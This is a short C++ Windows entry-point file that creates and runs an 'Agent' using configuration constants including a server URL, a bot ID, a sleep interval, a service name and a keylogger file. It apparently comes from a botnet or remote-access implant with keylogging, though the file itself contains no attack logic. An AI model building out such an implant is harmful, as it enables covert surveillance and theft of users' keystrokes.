#include "agent.h"
#include "includes.h"



int WINAPI WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
	char* pPath;
	Agent *ag = new Agent(SERVER_URL, BOT_ID, SLEEP_INTERVAL,SERVICE_NAME, USER_AGENT, KEYLOGGER_FILE);
	ag->run();

	return 0;
}
